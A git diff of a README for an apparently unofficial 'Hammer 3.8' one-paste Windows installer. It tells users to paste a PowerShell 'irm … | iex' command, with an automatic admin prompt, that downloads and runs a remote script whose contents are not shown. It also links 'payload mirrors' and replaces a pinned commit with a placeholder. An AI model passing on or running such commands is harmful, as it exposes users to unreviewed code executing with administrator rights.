@@ -1,18 +1,20 @@
-# Hammer 3.8 (fixed connection) — One-paste installer
+﻿# Hammer 3.8 (fixed connection) — One-paste installer
+
+Branch: `Hammer-3.8-fixed-connection`
 
 Open **Windows PowerShell** (a UAC admin prompt will appear automatically) and paste:
 
 ```powershell
-irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@66e5d4535e2df5e7ab32a6717dff7c1b9fda191a/install.ps1 | iex
+irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@SCRIPTREV/install.ps1 | iex
 ```
 
 Direct GitHub raw (alternate):
 
 ```powershell
-irm https://raw.githubusercontent.com/dvahana2424-web/hammerdeckydowngrade/Hammer%203.8%20(fixed%20connection)/install.ps1 | iex
+irm https://raw.githubusercontent.com/dvahana2424-web/hammerdeckydowngrade/Hammer-3.8-fixed-connection/install.ps1 | iex
 ```
 
-Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) (primary) and [`Hammer 3.8 (fixed connection)` branch](https://github.com/dvahana2424-web/hammerdeckydowngrade/tree/Hammer%203.8%20(fixed%20connection)).
+Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) (primary) and [`Hammer-3.8-fixed-connection` branch](https://github.com/dvahana2424-web/hammerdeckydowngrade/tree/Hammer-3.8-fixed-connection).
 
 ## What changed in this build
 
